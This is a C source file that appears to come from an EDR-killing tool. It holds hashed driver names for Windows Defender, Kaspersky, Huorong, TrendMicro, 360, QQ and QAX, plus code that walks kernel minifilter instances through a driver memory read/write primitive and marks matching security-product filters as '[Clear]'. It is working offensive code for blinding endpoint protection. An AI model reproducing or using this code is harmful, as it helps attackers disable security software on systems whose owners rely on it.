#include "Common.h"
#include "Structs.h"

#include <stdio.h>

static INT64 EDRIntance[500] = { 0 };


static CONST CHAR* subKESDriver[] = {
	"KES-21-19",
	"KES-21-18",

	NULL
};

static const UINT32 AVDriverHashes[] = {
	// WindowsDefender
	0x7E4D2512,0x1A330284,0xDED88530,0xA2A98222,0x7D911820,

	// KES
	0x3E12B6FE,0x571CA6FF,0x3CC480EF,0x54937AD7,0xF7BE44F8,0x7E235EA1,0x86874B8B,0xD359413E,0xA9819418,0xF1F36EBF,0x01ED40A3,0x4619C487,
	0xA8E77CD2,0x82C5F13E,0x610A107F,0xF55A2F67,0x073F04BF,0xEEA2357F,0xEDB8DA78,0xE14D1AC8,0x8B05A2F1,0x62D34354,0x53B293AF,0x0B8D3901,
	0x3FE6C283,0xCF500A97,0x502EDE53,0x168A52E7,0x396821BB,0x13F4A216,0xD12FDB61,0x7960C13B,0xD27C5841,0xC17181CA,0x63DB05B8,0xBCC3FAA4,
	0x32834046,0x65B1ACC7,0x9BA48E39,0xA4CE5A08,0x845BEEA8,0x98487B2C,0x24EC600E,0x1E6EE6AF,0x073F04BF,0xBD113F5B,0x837593DF,0x030A0D8A,
	0x99396BEC,0x9D7C7F3E,0xD83021DF,0x7DFB6117,0xBF5DDE48,0x45D6DBCF,0x3CE21B9B,0x923563E9,0x9FFD0E46,0x0E562194,

	// Huorong
	0xB1FC83F6,0x4E477102,0x45B3019A,0x74D4FE38,

	// TrendMicro
	0x45B3019A,0x74D4FE38,

	// Fucking360
	0x1769D599,0xE0CB15E9,0x97450F17,0xA23F8699,0x8E10C152,0xFE7A205E,0xAFFFFF43,0x9099945E,0xA4778C2F,0x8A336A20,0xE0CB15E9,0x773C859D,
	0xAA4E092B,0x13DAC3F0,0x9237715B,0xD7E260AA,

	// QQ
	0x7087ED00,0x4DE04A6C,0xD8BCF2E8,0x4614A037,0xF58868D5,0xF6D9E3E2,0x32B80ABF,

	// QAX
	0xC3C27A06,0x1A35000E,0xEA5FD256,0xB631AED2,0x365F51E1,0x229DC07D,0xF79B4B0C,

	NULL
};

VOID AddEDRIntance(INT64 InstanceAddr) {
	INT i = 0;
	while (EDRIntance[i] != 0) {
		i++;
	}
	EDRIntance[i] = InstanceAddr;
}

BOOL IsEDRIntance(INT j, INT64 Flink) {
	Flink += 0x10;
	INT k = 0;
	BOOL Flag = 0;
	INT64 FilterAddr = 0;
	INT64 InstanceAddr = 0;
	DWORD dwMajor = GetNtVersion();
	DWORD dwbuild = GetNtBuild();
	// Read instance address
	DriverMemoryOperation((VOID*)Flink, &InstanceAddr, 8, MEMORY_WRITE);

	// Check if instance is in EDR list
	while (EDRIntance[k] != 0) {
		if (EDRIntance[k] == InstanceAddr) {
			Flag = 1;
		}
		k++;
	}
	if (!Flag) {
		return Flag;
	}

	// Adjust offset based on Windows version
	if (dwMajor == 10 && dwbuild == 26100) {
		InstanceAddr += 0x48;
	}
	else if (dwMajor == 10) {
		InstanceAddr += 0x40;
	}
	else if (dwMajor == 6) {
		InstanceAddr += 0x30;
	}
	else {
		PRINT("[IsEDRIntance] Unsupported Windows version.\n");
		exit(0);
	}

	// Read filter address
	DriverMemoryOperation((VOID*)InstanceAddr, &FilterAddr, 8, MEMORY_WRITE);
	CHAR* FilterName = ReadDriverName(FilterAddr);
	if (FilterName == NULL) {
		
		return 0;
	}
	PRINT("\t\t[%d] %s : %I64x [Clear]\n", j, FilterName, Flink - 0x10);

	return Flag;
}

BOOL IsEDRHash(const PCHAR DriverName) {
	// Input validation
	if (!DriverName) {
		return FALSE;
	}

	// Pre-calculate hash to avoid multiple computations
	const UINT32 driverHash = CHASH(DriverName);

	// Ensure arrays are not empty at compile time
	static_assert(sizeof(AVDriverHashes) > 0, "AVDriverHashes array is empty");
	static_assert(sizeof(subKESDriver) > 0, "PrefixAVDriver array is empty");

	// Check for hash matches in known EDR drivers
	for (size_t i = 0; AVDriverHashes[i] != NULL; i++) {
		if (driverHash == AVDriverHashes[i]) {
			return TRUE;
		}
	}

	// Check for sub string matches in known EDR drivers
	for (size_t i = 0; subKESDriver[i] != NULL; i++) {
		if (ci_strstr(DriverName, subKESDriver[i])) {
			return TRUE;
		}
	}

	return FALSE;
}
